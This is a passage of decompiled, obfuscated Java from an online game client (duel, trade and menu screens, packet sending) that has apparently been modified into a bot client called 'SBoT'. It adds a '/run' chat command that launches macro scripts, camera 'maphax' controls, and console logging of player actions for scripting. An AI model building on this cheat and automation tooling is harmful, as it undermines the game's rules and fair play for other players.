            if(super.anInt33 > 15 && super.anInt33 < 96 && super.anInt36 == 1)
                anInt780 = 0;
            if(super.anInt33 > 110 && super.anInt33 < 194 && super.anInt36 == 1)
            {
                anInt780 = 1;
                aClass4_775.anIntArray187[anInt776] = 0xf423f;
            }
            if(super.anInt33 > 215 && super.anInt33 < 295 && super.anInt36 == 1)
            {
                anInt780 = 2;
                aClass4_775.anIntArray187[anInt778] = 0xf423f;
            }
            if(super.anInt33 > 315 && super.anInt33 < 395 && super.anInt36 == 1)
            {
                anInt780 = 3;
                aClass4_775.anIntArray187[anInt779] = 0xf423f;
            }
            if(super.anInt33 > 417 && super.anInt33 < 497 && super.anInt36 == 1)
            {
                anInt986 = 1;
                anInt863 = 0;
                super.fln = "";
                super.fma = "";
            }
            super.anInt36 = 0;
            super.anInt35 = 0;
        }
        aClass4_775.method139(super.anInt33, super.anInt34, super.anInt36, super.anInt35);
        if(anInt780 > 0 && super.anInt33 >= 494 && super.anInt34 >= anInt677 - 66)
            super.anInt36 = 0;
        if(aClass4_775.buttonDown(anInt777))
        {
            String s = aClass4_775.method170(anInt777);
            aClass4_775.method169(anInt777, "");
            if(s.startsWith("::"))
            {
                if(s.equalsIgnoreCase("::closecon") && !aBoolean979)
                    super.packets.method329();
                else
                if(s.equalsIgnoreCase("::logout") && !aBoolean979)
                    method22();
                else
                if(s.equalsIgnoreCase("::lostcon") && !aBoolean979)
                    method23();
                else
                    method35(s.substring(2));
            } else
            {
				if (s.startsWith("/"))
				{
					if (s.startsWith("/run "))
					{
						if (Running == false)
						{
							
							s = s.substring(5);
							System.out.println(s);
							int paramIndex = s.indexOf(" ");
							if(paramIndex == -1)
								macro = (Script)macros.get(s);
							else
								macro = (Script)macros.get(s.substring(0,paramIndex));

							String param = null;
							String tcmd = null;

							if (paramIndex != -1)
							{
								param = s.substring(paramIndex + 1);
								tcmd = s.substring(0,paramIndex);
							}
							else
							{
								param = null;
								tcmd = s;
							}

							String [] param1  = null;
							if (param != null)
							{
								param1 = param.split("@");
								for (int a = 0; a < param1.length; a++)
									param1[a] = param1[a].trim();
							}


							final String [] params = param1;
							final String cmd = tcmd;

							if (macro == null)
							{
								DisplayMessage("@gre@SBoT: @whi@COMMAND: " + s + " NOT FOUND", 3);
							} else {
								Thread thread = new Thread(new Runnable()
								{
									public void run()
									{
										macro.start(cmd,params);
									}
								});
								Running = true;
								thread.start();
								return;
							}
						} else {
							DisplayMessage("@gre@SBoT: @whi@There is a script already running, F9 to stop it", 3);
						}
					}
				} else {
                int k3 = cen.cfe(s);
                acn(cen.cfa, k3);
                s = cen.cfd(cen.cfa, 0, k3);
                s = ffn.fhe(s);
                myplayer.lastSaidTime = 150;
                myplayer.lastSaidMessage = s;
                DisplayMessage(myplayer.name + ": " + s, 2);
				}
            }
        }
        if(anInt780 == 0)
        {
            for(int l1 = 0; l1 < 5; l1++)
                if(anIntArray935[l1] > 0)
                    anIntArray935[l1]--;

        }
        if(enb != 0)
            super.anInt36 = 0;
        if(tradeFirst || aBoolean917)
        {
            if(super.anInt35 != 0)
                anInt818++;
            else
                anInt818 = 0;
            if(anInt818 > 600)
                anInt819 += 5000;
            else
            if(anInt818 > 450)
                anInt819 += 500;
            else
            if(anInt818 > 300)
                anInt819 += 50;
            else
            if(anInt818 > 150)
                anInt819 += 5;
            else
            if(anInt818 > 50)
                anInt819++;
            else
            if(anInt818 > 20 && (anInt818 & 5) == 0)
                anInt819++;
        } else
        {
            anInt818 = 0;
            anInt819 = 0;
        }
        if(super.anInt36 == 1)
            anInt813 = 1;
        else
        if(super.anInt36 == 2)
            anInt813 = 2;
        aClass10_739.method277(super.anInt33, super.anInt34);
        super.anInt36 = 0;
        if(aBoolean675)
        {
            if(anInt941 == 0 || aBoolean757)
            {
                if(super.aBoolean26)
                {
                    anInt940 = anInt940 + 1 & 7;
                    super.aBoolean26 = false;
                    if(!aBoolean789)
                    {
                        if((anInt940 & 1) == 0)
                            anInt940 = anInt940 + 1 & 7;
                        for(int i2 = 0; i2 < 8; i2++)
                        {
                            if(method112(anInt940))
                                break;
                            anInt940 = anInt940 + 1 & 7;
                        }

                    }
                }
                if(super.aBoolean27)
                {
                    anInt940 = anInt940 + 7 & 7;
                    super.aBoolean27 = false;
                    if(!aBoolean789)
                    {
                        if((anInt940 & 1) == 0)
                            anInt940 = anInt940 + 7 & 7;
                        for(int j2 = 0; j2 < 8; j2++)
                        {
                            if(method112(anInt940))
                                break;
                            anInt940 = anInt940 + 7 & 7;
                        }

                    }
                }
            }
        } else
        if(super.aBoolean26)
            anInt729 = anInt729 + 2 & 0xff;
        else
        if(super.aBoolean27)
            anInt729 = anInt729 - 2 & 0xff;
                  if(home)
                maphax -= 5;
                if(end)
               maphax += 5;
		if(arrowkeyup)
            yrot -= 3;
        if(arrowkeydown)
            yrot += 3;
		if(pgupdown)
			anInt683 += 10;
		if(pgdowndown)
			anInt683 -= 10;
        if(ehd > 0)
            ehd--;
        else
        if(ehd < 0)
            ehd++;
        aClass10_739.method307(17);
        anInt964++;
        if(anInt964 > 5)
        {
            anInt964 = 0;
            anInt839 = (anInt839 + 1) % 3;
            anInt840 = (anInt840 + 1) % 4;
            anInt841 = (anInt841 + 1) % 5;
        }
        for(int k2 = 0; k2 < mobCount; k2++)
        {
            int l3 = mobx[k2];
            int l4 = moby[k2];
            if(l3 >= 0 && l4 >= 0 && l3 < 96 && l4 < 96 && mobtype[k2] == 74)
                aClass5Array814[k2].method189(1, 0, 0);
        }

        for(int i4 = 0; i4 < anInt833; i4++)
        {
            anIntArray972[i4]++;
            if(anIntArray972[i4] > 50)
            {
                anInt833--;
                for(int i5 = i4; i5 < anInt833; i5++)
                {
                    anIntArray881[i5] = anIntArray881[i5 + 1];
                    anIntArray934[i5] = anIntArray934[i5 + 1];
                    anIntArray972[i5] = anIntArray972[i5 + 1];
                    anIntArray730[i5] = anIntArray730[i5 + 1];
                }

            }
        }

    }

    public final boolean method83(int i, int j, int k, int l, int i1, int j1, boolean flag, 
            boolean flag1)
    {
		try
		{
			int i2 = identify.anInt144;
			int k1 = efh.method411(i, j, k, l, i1, j1, anIntArray962, anIntArray963, flag);
			if(k1 == -1)
				if(flag1)
				{
					k1 = 1;
					anIntArray962[0] = k;
					anIntArray963[0] = l;
				} else
				{
					return false;
				}
			k1--;
			i = anIntArray962[k1];
			j = anIntArray963[k1];
			k1--;
			if(flag1)
				super.packets.id(226);
			else
				super.packets.id(211);
			super.packets.cmd(i + bigx);
			super.packets.cmd(j + bigy);
			if(flag1 && k1 == -1 && (i + bigx) % 5 == 0)
				k1 = 0;
			for(int l1 = k1; l1 >= 0 && l1 > k1 - 25; l1--)
			{
				super.packets.var(anIntArray962[l1] - i);
				super.packets.var(anIntArray963[l1] - j);
			}

			super.packets.send();
			ehd = -24;
			anInt671 = super.anInt33;
			anInt672 = super.anInt34;
			return true;
		}
		catch (Exception e) 
		{
			e.toString();
			return false;
		}
    }

    public final boolean method84(int i, int j, int k, int l, int i1, int j1, boolean flag, 
            boolean flag1)
    {
		try
		{
			int i2 = identify.anInt144;
			int k1 = efh.method411(i, j, k, l, i1, j1, anIntArray962, anIntArray963, flag);
			if(k1 == -1)
				return false;
			k1--;
			i = anIntArray962[k1];
			j = anIntArray963[k1];
			k1--;
			if(flag1)
				super.packets.id(226);
			else
				super.packets.id(211);
			super.packets.cmd(i + bigx);
			super.packets.cmd(j + bigy);
			if(flag1 && k1 == -1 && (i + bigx) % 5 == 0)
				k1 = 0;
			for(int l1 = k1; l1 >= 0 && l1 > k1 - 25; l1--)
			{
				super.packets.var(anIntArray962[l1] - i);
				super.packets.var(anIntArray963[l1] - j);
			}

			super.packets.send();
			ehd = -24;
			anInt671 = super.anInt33;
			anInt672 = super.anInt34;
		}
		catch (IndexOutOfBoundsException e)
		{
			e.toString();
			return false;
		}
        return true;
    }

    public final void method85()
    {
        try
        {
            if(gfx != null)
            {
                gfx.method224();
                gfx.anIntArray317 = null;
                gfx = null;
            }
            if(aClass10_739 != null)
            {
                aClass10_739.method271();
                aClass10_739 = null;
            }
            aClass5Array994 = null;
            aClass5Array814 = null;
            aClass5Array781 = null;
            aClass2Array891 = null;
            player = null;
            aClass2Array957 = null;
            npc = null;
            myplayer = null;
            if(efh != null)
            {
                efh.aClass5Array600 = null;
                efh.aClass5ArrayArray605 = null;
                efh.aClass5ArrayArray603 = null;
                efh.aClass5_586 = null;
                efh = null;
            }
            System.gc();
            return;
        }
        catch(Exception _ex)
        {
			_ex.toString();
            return;
        }
    }

    public final void method86()
    {
        int i1 = identify.anInt144;
        byte abyte0[] = null;
        byte abyte1[] = null;
        abyte0 = method18("entity" + Class18.anInt579 + ".jag", "people and monsters", 30);
        if(abyte0 == null)
        {
            aBoolean922 = true;
            return;
        }
        abyte1 = fnf.method366("index.dat", 0, abyte0);
        byte abyte2[] = null;
        byte abyte3[] = null;
        if(member)
        {
            abyte2 = method18("entity" + Class18.anInt579 + ".mem", "member graphics", 45);
            if(abyte2 == null)
            {
                aBoolean922 = true;
                return;
            }
            abyte3 = fnf.method366("index.dat", 0, abyte2);
        }
        int i = 0;
        anInt942 = 0;
        anInt943 = anInt942;
label0:
        for(int j = 0; j < identify.anInt123; j++)
        {
            String s = identify.aStringArray77[j];
            for(int k = 0; k < j; k++)
            {
                if(!identify.aStringArray77[k].equalsIgnoreCase(s))
                    continue;
                identify.anIntArray87[j] = identify.anIntArray87[k];
                continue label0;
            }

            byte abyte7[] = fnf.method366(s + ".dat", 0, abyte0);
            byte abyte4[] = abyte1;
            if(abyte7 == null && member)
            {
                abyte7 = fnf.method366(s + ".dat", 0, abyte2);
                abyte4 = abyte3;
            }
            if(abyte7 != null)
            {
                gfx.method225(anInt943, abyte7, abyte4, 15);
                i += 15;
                if(identify.anIntArray85[j] == 1)
                {
                    byte abyte8[] = fnf.method366(s + "a.dat", 0, abyte0);
                    byte abyte5[] = abyte1;
                    if(abyte8 == null && member)
                    {
                        abyte8 = fnf.method366(s + "a.dat", 0, abyte2);
                        abyte5 = abyte3;
                    }
                    gfx.method225(anInt943 + 15, abyte8, abyte5, 3);
                    i += 3;
                }
                if(identify.anIntArray86[j] == 1)
                {
                    byte abyte9[] = fnf.method366(s + "f.dat", 0, abyte0);
                    byte abyte6[] = abyte1;
                    if(abyte9 == null && member)
                    {
                        abyte9 = fnf.method366(s + "f.dat", 0, abyte2);
                        abyte6 = abyte3;
                    }
                    gfx.method225(anInt943 + 18, abyte9, abyte6, 9);
                    i += 9;
                }
                if(identify.anIntArray84[j] != 0)
                {
                    for(int l = anInt943; l < anInt943 + 27; l++)
                        gfx.method228(l);

                }
            }
            identify.anIntArray87[j] = anInt943;
            anInt943 += 27;
        }
    }

    public final void method87()
    {
        int i7 = identify.anInt144;
        if(anInt813 != 0 && anInt819 == 0)
            anInt819 = 1;
        if(anInt819 > 0)
        {
            int i = super.anInt33 - 22;
            int j = super.anInt34 - 36;
            if(i >= 0 && j >= 0 && i < 468 && j < 262)
            {
                if(i > 216 && j > 30 && i < 462 && j < 235)
                {
                    int k = (i - 217) / 49 + ((j - 31) / 34) * 5;
                    if(k >= 0 && k < InvCount)
                    {
                        boolean flag1 = false;
                        int l1 = 0;
                        int k2 = inv[k];
                        for(int k3 = 0; k3 < anInt910; k3++)
                            if(anIntArray911[k3] == k2)
                                if(identify.ahl[k2] == 0)
                                {
                                    for(int i4 = 0; i4 < anInt819; i4++)
                                    {
                                        if(anIntArray912[k3] < dkb[k])
                                            anIntArray912[k3]++;
                                        flag1 = true;
                                    }

                                } else
                                {
                                    l1++;
                                }

                        if(InvCount(k2) <= l1)
                            flag1 = true;
                        if(identify.anIntArray59[k2] == 1)
                        {
                            DisplayMessage("This object cannot be added to a duel offer", 3);
                            flag1 = true;
                        }
                        if(!flag1 && anInt910 < 8)
                        {
                            anIntArray911[anInt910] = k2;
                            anIntArray912[anInt910] = 1;
                            anInt910++;
                            flag1 = true;
                        }
                        if(flag1)
                        {
                            super.packets.id(229);
                            super.packets.var(anInt910);
                            for(int j4 = 0; j4 < anInt910; j4++)
                            {
                                super.packets.cmd(anIntArray911[j4]);
                                super.packets.hfb(anIntArray912[j4]);
                            }

                            super.packets.send();
                            aBoolean668 = false;
                            aBoolean669 = false;
                        }
                    }
                }
                if(i > 8 && j > 30 && i < 205 && j < 129)
                {
                    int l = (i - 9) / 49 + ((j - 31) / 34) * 4;
                    if(l >= 0 && l < anInt910)
                    {
                        int j1 = anIntArray911[l];
                        for(int i2 = 0; i2 < anInt819; i2++)
                        {
                            if(identify.ahl[j1] == 0 && anIntArray912[l] > 1)
                            {
                                anIntArray912[l]--;
                                continue;
                            }
                            anInt910--;
                            anInt818 = 0;
                            for(int l2 = l; l2 < anInt910; l2++)
                            {
                                anIntArray911[l2] = anIntArray911[l2 + 1];
                                anIntArray912[l2] = anIntArray912[l2 + 1];
                            }

                            break;
                        }

                        super.packets.id(299);
                        super.packets.var(anInt910);
                        for(int i3 = 0; i3 < anInt910; i3++)
                        {
                            super.packets.cmd(anIntArray911[i3]);
                            super.packets.hfb(anIntArray912[i3]);
                        }

                        super.packets.send();
                        aBoolean668 = false;
                        aBoolean669 = false;
                    }
                }
                boolean flag = false;
                if(i >= 93 && j >= 221 && i <= 104 && j <= 232)
                {
                    aBoolean718 = !aBoolean718;
                    flag = true;
                }
                if(i >= 93 && j >= 240 && i <= 104 && j <= 251)
                {
                    aBoolean719 = !aBoolean719;
                    flag = true;
                }
                if(i >= 191 && j >= 221 && i <= 202 && j <= 232)
                {
                    aBoolean720 = !aBoolean720;
                    flag = true;
                }
                if(i >= 191 && j >= 240 && i <= 202 && j <= 251)
                {
                    aBoolean721 = !aBoolean721;
                    flag = true;
                }
                if(flag)
                {
                    super.packets.id(138);
                    super.packets.var(aBoolean718 ? 1 : 0);
                    super.packets.var(aBoolean719 ? 1 : 0);
                    super.packets.var(aBoolean720 ? 1 : 0);
                    super.packets.var(aBoolean721 ? 1 : 0);
                    super.packets.send();
                    aBoolean668 = false;
                    aBoolean669 = false;
                }
                if(i >= 217 && j >= 238 && i <= 286 && j <= 259)
                {
                    aBoolean669 = true;
                    super.packets.id(125);
                    super.packets.send();
                }
                if(i >= 394 && j >= 238 && i < 463 && j < 259)
                {
                    aBoolean917 = false;
                    super.packets.id(43);
                    super.packets.send();
                }
            } else
            if(anInt813 != 0)
            {
                aBoolean917 = false;
                super.packets.id(43);
                super.packets.send();
            }
            anInt813 = 0;
            anInt819 = 0;
        }
        if(!aBoolean917)
            return;
        byte byte0 = 22;
        byte byte1 = 36;
        gfx.method216(byte0, byte1, 468, 12, 0xc90b1d);
        int i1 = 0x989898;
        gfx.method214(byte0, byte1 + 12, 468, 18, i1, 160);
        gfx.method214(byte0, byte1 + 30, 8, 248, i1, 160);
        gfx.method214(byte0 + 205, byte1 + 30, 11, 248, i1, 160);
        gfx.method214(byte0 + 462, byte1 + 30, 6, 248, i1, 160);
        gfx.method214(byte0 + 8, byte1 + 99, 197, 24, i1, 160);
        gfx.method214(byte0 + 8, byte1 + 192, 197, 23, i1, 160);
        gfx.method214(byte0 + 8, byte1 + 258, 197, 20, i1, 160);
        gfx.method214(byte0 + 216, byte1 + 235, 246, 43, i1, 160);
        int k1 = 0xd0d0d0;
        gfx.method214(byte0 + 8, byte1 + 30, 197, 69, k1, 160);
        gfx.method214(byte0 + 8, byte1 + 123, 197, 69, k1, 160);
        gfx.method214(byte0 + 8, byte1 + 215, 197, 43, k1, 160);
        gfx.method214(byte0 + 216, byte1 + 30, 246, 205, k1, 160);
        for(int j2 = 0; j2 < 3; j2++)
            gfx.method218(byte0 + 8, byte1 + 30 + j2 * 34, 197, 0);

        for(int j3 = 0; j3 < 3; j3++)
            gfx.method218(byte0 + 8, byte1 + 123 + j3 * 34, 197, 0);

        for(int l3 = 0; l3 < 7; l3++)
            gfx.method218(byte0 + 216, byte1 + 30 + l3 * 34, 246, 0);

        for(int k4 = 0; k4 < 6; k4++)
        {
            if(k4 < 5)
                gfx.method219(byte0 + 8 + k4 * 49, byte1 + 30, 69, 0);
            if(k4 < 5)
                gfx.method219(byte0 + 8 + k4 * 49, byte1 + 123, 69, 0);
            gfx.method219(byte0 + 216 + k4 * 49, byte1 + 30, 205, 0);
        }

        gfx.method218(byte0 + 8, byte1 + 215, 197, 0);
        gfx.method218(byte0 + 8, byte1 + 257, 197, 0);
        gfx.method219(byte0 + 8, byte1 + 215, 43, 0);
        gfx.method219(byte0 + 204, byte1 + 215, 43, 0);
        gfx.method257("Preparing to duel with: " + aString824, byte0 + 1, byte1 + 10, 1, 0xffffff);
        gfx.method257("Your Stake", byte0 + 9, byte1 + 27, 4, 0xffffff);
        gfx.method257("Opponent's Stake", byte0 + 9, byte1 + 120, 4, 0xffffff);
        gfx.method257("Duel Options", byte0 + 9, byte1 + 212, 4, 0xffffff);
        gfx.method257("Your Inventory", byte0 + 216, byte1 + 27, 4, 0xffffff);
        gfx.method257("No retreating", byte0 + 8 + 1, byte1 + 215 + 16, 3, 0xffff00);
        gfx.method257("No magic", byte0 + 8 + 1, byte1 + 215 + 35, 3, 0xffff00);
        gfx.method257("No prayer", byte0 + 8 + 102, byte1 + 215 + 16, 3, 0xffff00);
        gfx.method257("No weapons", byte0 + 8 + 102, byte1 + 215 + 35, 3, 0xffff00);
        gfx.method217(byte0 + 93, byte1 + 215 + 6, 11, 11, 0xffff00);
        if(aBoolean718)
            gfx.method216(byte0 + 95, byte1 + 215 + 8, 7, 7, 0xffff00);
        gfx.method217(byte0 + 93, byte1 + 215 + 25, 11, 11, 0xffff00);
        if(aBoolean719)
            gfx.method216(byte0 + 95, byte1 + 215 + 27, 7, 7, 0xffff00);
        gfx.method217(byte0 + 191, byte1 + 215 + 6, 11, 11, 0xffff00);
        if(aBoolean720)
            gfx.method216(byte0 + 193, byte1 + 215 + 8, 7, 7, 0xffff00);
        gfx.method217(byte0 + 191, byte1 + 215 + 25, 11, 11, 0xffff00);
        if(aBoolean721)
            gfx.method216(byte0 + 193, byte1 + 215 + 27, 7, 7, 0xffff00);
        if(!aBoolean669)
            gfx.method231(byte0 + 217, byte1 + 238, anInt948 + 25);
        gfx.method231(byte0 + 394, byte1 + 238, anInt948 + 26);
        if(aBoolean668)
        {
            gfx.drawString("Other player", byte0 + 341, byte1 + 246, 1, 0xffffff);
            gfx.drawString("has accepted", byte0 + 341, byte1 + 256, 1, 0xffffff);
        }
        if(aBoolean669)
        {
            gfx.drawString("Waiting for", byte0 + 217 + 35, byte1 + 246, 1, 0xffffff);
            gfx.drawString("other player", byte0 + 217 + 35, byte1 + 256, 1, 0xffffff);
        }
        for(int l4 = 0; l4 < InvCount; l4++)
        {
            int i5 = 217 + byte0 + (l4 % 5) * 49;
            int k5 = 31 + byte1 + (l4 / 5) * 34;
            gfx.method247(i5, k5, 48, 32, anInt950 + identify.anIntArray53[inv[l4]], identify.anIntArray58[inv[l4]], 0, 0, false);
            if(identify.ahl[inv[l4]] == 0)
                gfx.method257(String.valueOf(dkb[l4]), i5 + 1, k5 + 10, 1, 0xffff00);
        }

        for(int j5 = 0; j5 < anInt910; j5++)
        {
            int l5 = 9 + byte0 + (j5 % 4) * 49;
            int j6 = 31 + byte1 + (j5 / 4) * 34;
            gfx.method247(l5, j6, 48, 32, anInt950 + identify.anIntArray53[anIntArray911[j5]], identify.anIntArray58[anIntArray911[j5]], 0, 0, false);
            if(identify.ahl[anIntArray911[j5]] == 0)
                gfx.method257(String.valueOf(anIntArray912[j5]), l5 + 1, j6 + 10, 1, 0xffff00);
            if(super.anInt33 > l5 && super.anInt33 < l5 + 48 && super.anInt34 > j6 && super.anInt34 < j6 + 32)
                gfx.method257(identify.itemName[anIntArray911[j5]] + ": @whi@" + identify.itemDesc[anIntArray911[j5]], byte0 + 8, byte1 + 273, 1, 0xffff00);
        }

        for(int i6 = 0; i6 < anInt959; i6++)
        {
            int k6 = 9 + byte0 + (i6 % 4) * 49;
            int l6 = 124 + byte1 + (i6 / 4) * 34;
            gfx.method247(k6, l6, 48, 32, anInt950 + identify.anIntArray53[anIntArray960[i6]], identify.anIntArray58[anIntArray960[i6]], 0, 0, false);
            if(identify.ahl[anIntArray960[i6]] == 0)
                gfx.method257(String.valueOf(anIntArray961[i6]), k6 + 1, l6 + 10, 1, 0xffff00);
            if(super.anInt33 > k6 && super.anInt33 < k6 + 48 && super.anInt34 > l6 && super.anInt34 < l6 + 32)
                gfx.method257(identify.itemName[anIntArray960[i6]] + ": @whi@" + identify.itemDesc[anIntArray960[i6]], byte0 + 8, byte1 + 273, 1, 0xffff00);
        }

    }

    public final void method88()
    {
        gfx.method216(126, 137, 260, 60, 0);
        gfx.method217(126, 137, 260, 60, 0xffffff);
        gfx.drawString("Logging out...", 256, 173, 5, 0xffffff);
    }

    public final void method89(int i, String s)
    {
        int j = mobx[i];
        int k = moby[i];
        int l = j - myplayer.x / 128;
        int i1 = k - myplayer.y / 128;
        byte byte0 = 7;
        if(j >= 0 && k >= 0 && j < 96 && k < 96 && l > -byte0 && l < byte0 && i1 > -byte0 && i1 < byte0)
        {
            aClass10_739.method270(aClass5Array814[i]);
            int j1 = identify.method124(s);
            Class5 class5 = aClass5Array994[j1].method204();
            aClass10_739.method269(class5);
            class5.method185(true, 48, 48, -50, -10, -50);
            class5.method206(aClass5Array814[i]);
            class5.anInt257 = i;
            aClass5Array814[i] = class5;
        }
    }

    public final void method90()
    {
        int k = identify.anInt144;
        byte byte0 = 7;
        byte byte1 = 15;
        char c = '\257';
        if(anInt813 != 0)
        {
            for(int i = 0; i < 5; i++)
            {
                if(i <= 0 || super.anInt33 <= byte0 || super.anInt33 >= byte0 + c || super.anInt34 <= byte1 + i * 20 || super.anInt34 >= byte1 + i * 20 + 20)
                    continue;
                fightmode = i - 1;
                anInt813 = 0;
                super.packets.id(74);
                super.packets.var(fightmode);
                super.packets.send();
                break;
            }

        }
        for(int j = 0; j < 5; j++)
        {
            if(j == fightmode + 1)
                gfx.method214(byte0, byte1 + j * 20, c, 20, Class6.method223(255, 0, 0), 128);
            else
                gfx.method214(byte0, byte1 + j * 20, c, 20, Class6.method223(190, 190, 190), 128);
            gfx.method218(byte0, byte1 + j * 20, c, 0);
            gfx.method218(byte0, byte1 + j * 20 + 20, c, 0);
        }

        gfx.drawString("Select combat style", byte0 + c / 2, byte1 + 16, 3, 0xffffff);
        gfx.drawString("Controlled (+1 of each)", byte0 + c / 2, byte1 + 36, 3, 0);
        gfx.drawString("Aggressive (+3 strength)", byte0 + c / 2, byte1 + 56, 3, 0);
        gfx.drawString("Accurate   (+3 attack)", byte0 + c / 2, byte1 + 76, 3, 0);
        gfx.drawString("Defensive  (+3 defense)", byte0 + c / 2, byte1 + 96, 3, 0);
    }

    public final void method91()
    {
        int i2 = identify.anInt144;
        if(selectedspell >= 0 || selecteditem >= 0)
        {
            firstmsg[listcount] = "Cancel";
            secondmsg[listcount] = "";
            actiontype[listcount] = 4000;
            listcount++;
        }
        for(int i = 0; i < listcount; i++)
            anIntArray984[i] = i;

        for(boolean flag = false; !flag;)
        {
            flag = true;
            for(int j = 0; j < listcount - 1; j++)
            {
                int l = anIntArray984[j];
                int j1 = anIntArray984[j + 1];
                if(actiontype[l] > actiontype[j1])
                {
                    anIntArray984[j] = j1;
                    anIntArray984[j + 1] = l;
                    flag = false;
                }
            }

        }

        if(listcount > 20)
            listcount = 20;
        if(listcount > 0)
        {
            int k = -1;
            for(int i1 = 0; i1 < listcount; i1++)
            {
                if(secondmsg[anIntArray984[i1]] == null || secondmsg[anIntArray984[i1]].length() <= 0)
                    continue;
                k = i1;
                break;
            }

            String s = null;
            if((selecteditem >= 0 || selectedspell >= 0) && listcount == 1)
                s = "Choose a target";
            else
            if((selecteditem >= 0 || selectedspell >= 0) && listcount > 1)
                s = "@whi@" + firstmsg[anIntArray984[0]] + " " + secondmsg[anIntArray984[0]];
            else
            if(k != -1)
                s = secondmsg[anIntArray984[k]] + ": @whi@" + firstmsg[anIntArray984[0]];
            if(listcount == 2 && s != null)
                s = s + "@whi@ / 1 more option";
            if(listcount > 2 && s != null)
                s = s + "@whi@ / " + (listcount - 1) + " more options";
            if(s != null)
                gfx.method257(s, 6, 14, 1, 0xffff00);
            if(!aBoolean767 && anInt813 == 1 || aBoolean767 && anInt813 == 1 && listcount == 1)
            {
                fem(anIntArray984[0]);
                anInt813 = 0;
                return;
            }
            if(!aBoolean767 && anInt813 == 2 || aBoolean767 && anInt813 == 1)
            {
                anInt755 = (listcount + 1) * 15;
                anInt754 = gfx.method263("Choose option", 1) + 5;
                for(int k1 = 0; k1 < listcount; k1++)
                {
                    int l1 = gfx.method263(firstmsg[k1] + " " + secondmsg[k1], 1) + 5;
                    if(l1 > anInt754)
                        anInt754 = l1;
                }

                anInt752 = super.anInt33 - anInt754 / 2;
                anInt753 = super.anInt34 - 7;
                aBoolean854 = true;
                if(anInt752 < 0)
                    anInt752 = 0;
                if(anInt753 < 0)
                    anInt753 = 0;
                if(anInt752 + anInt754 > 510)
                    anInt752 = 510 - anInt754;
                if(anInt753 + anInt755 > 315)
                    anInt753 = 315 - anInt755;
                anInt813 = 0;
            }
        }
    }

    public final void method92()
    {
        int l = identify.anInt144;
        byte byte0 = 22;
        byte byte1 = 36;
        gfx.method216(byte0, byte1, 468, 16, 192);
        int i = 0x989898;
        gfx.method214(byte0, byte1 + 16, 468, 246, i, 160);
        gfx.drawString("Please confirm your trade with @yel@" + fnf.method363(aLong847), byte0 + 234, byte1 + 12, 1, 0xffffff);
        gfx.drawString("You are about to give:", byte0 + 117, byte1 + 30, 1, 0xffff00);
        for(int j = 0; j < anInt836; j++)
        {
            String s = identify.itemName[anIntArray837[j]];
            if(identify.ahl[anIntArray837[j]] == 0)
                s = s + " x " + method48(anIntArray838[j]);
            gfx.drawString(s, byte0 + 117, byte1 + 42 + j * 12, 1, 0xffffff);
        }

        if(anInt836 == 0)
            gfx.drawString("Nothing!", byte0 + 117, byte1 + 42, 1, 0xffffff);
        gfx.drawString("In return you will receive:", byte0 + 351, byte1 + 30, 1, 0xffff00);
        for(int k = 0; k < anInt691; k++)
        {
            String s1 = identify.itemName[anIntArray692[k]];
            if(identify.ahl[anIntArray692[k]] == 0)
                s1 = s1 + " x " + method48(anIntArray693[k]);
            gfx.drawString(s1, byte0 + 351, byte1 + 42 + k * 12, 1, 0xffffff);
        }

        if(anInt691 == 0)
            gfx.drawString("Nothing!", byte0 + 351, byte1 + 42, 1, 0xffffff);
        gfx.drawString("Are you sure you want to do this?", byte0 + 234, byte1 + 200, 4, 65535);
        gfx.drawString("There is NO WAY to reverse a trade if you change your mind.", byte0 + 234, byte1 + 215, 1, 0xffffff);
        gfx.drawString("Remember that not all players are trustworthy", byte0 + 234, byte1 + 230, 1, 0xffffff);
        if(!aBoolean674)
        {
            gfx.method231((byte0 + 118) - 35, byte1 + 238, anInt948 + 25);
            gfx.method231((byte0 + 352) - 35, byte1 + 238, anInt948 + 26);
        } else
        {
            gfx.drawString("Waiting for other player...", byte0 + 234, byte1 + 250, 1, 0xffff00);
        }
        if(anInt813 == 1)
        {
            if(super.anInt33 < byte0 || super.anInt34 < byte1 || super.anInt33 > byte0 + 468 || super.anInt34 > byte1 + 262)
            {
                tradeSecond = false;
                super.packets.id(27);
                super.packets.send();
            }
            if(super.anInt33 >= (byte0 + 118) - 35 && super.anInt33 <= byte0 + 118 + 70 && super.anInt34 >= byte1 + 238 && super.anInt34 <= byte1 + 238 + 21)
            {
                aBoolean674 = true;
                super.packets.id(102);
                super.packets.send();
            }
            if(super.anInt33 >= (byte0 + 352) - 35 && super.anInt33 <= byte0 + 353 + 70 && super.anInt34 >= byte1 + 238 && super.anInt34 <= byte1 + 238 + 21)
            {
                tradeSecond = false;
                super.packets.id(27);
                super.packets.send();
            }
            anInt813 = 0;
        }
    }

    public final void fem(int i)
    {
        int j = actionx[i];
        int k = actiony[i];
        int l = actionid[i];
        int i1 = actionvar[i];
        int j1 = actionvar2[i];
        int k1 = actiontype[i];
        if(k1 == 200)
        {
            System.out.println("MagicItem(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ", " + i1 + ");");
            fbc(smallx, smally, j, k, true);
            super.packets.id(18);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 210)
        {
            System.out.println("UseOnItem(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ", " + i1 + ");");
            fbc(smallx, smally, j, k, true);
            super.packets.id(255);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
            selecteditem = -1;
        }
        if(k1 == 220)
        {
            System.out.println("TakeItem(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ");");
            fbc(smallx, smally, j, k, true);
            super.packets.id(253);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.cmd(l);
            super.packets.cmd(i1);
            super.packets.send();
        }
        if(k1 == 3200)
        {
            System.out.println("Item: " + l);
            DisplayMessage(identify.itemDesc[l], 3);
        }
        if(k1 == 300)
        {
            System.out.println("MagicDoor(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ", " + i1 + ");");
            fef(j, k, l);
            super.packets.id(76);
            super.packets.cmd(j + bigx);
            super.packets.cmd(k + bigy);
            super.packets.var(l);
            super.packets.cmd(i1);
            super.packets.send();
            selectedspell = -1;
        }
        if(k1 == 310)
        {
            System.out.println("UseOnDoor(" + (j + bigx) + ", " + (k + bigy) + ", " + l + ", " + i1 + ");");
            fef(j, k, l);
            super.packets.id(71);
            super.packets.cmd(j + bigx);
